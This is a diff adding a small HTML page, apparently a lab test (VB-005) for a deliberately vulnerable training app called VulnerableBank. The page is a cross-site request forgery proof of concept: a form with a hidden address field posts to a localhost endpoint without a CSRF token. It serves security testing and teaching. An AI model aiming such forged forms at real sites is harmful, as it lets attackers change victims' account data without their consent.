@@ -1,0 +1,31 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>VB-005 CSRF Browser Test</title>
+</head>
+<body>
+    <h1>VB-005: Cross-Site Form Test</h1>
+
+    <p>
+        This local laboratory page submits a form to
+        VulnerableBank without a CSRF token.
+    </p>
+
+    <form
+        action="http://127.0.0.1:8000/api/lab/csrf/profile-address"
+        method="POST"
+        target="_blank"
+    >
+        <input
+            type="hidden"
+            name="address"
+            value="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        >
+
+        <button type="submit">
+            Run controlled CSRF test
+        </button>
+    </form>
+</body>
+</html>
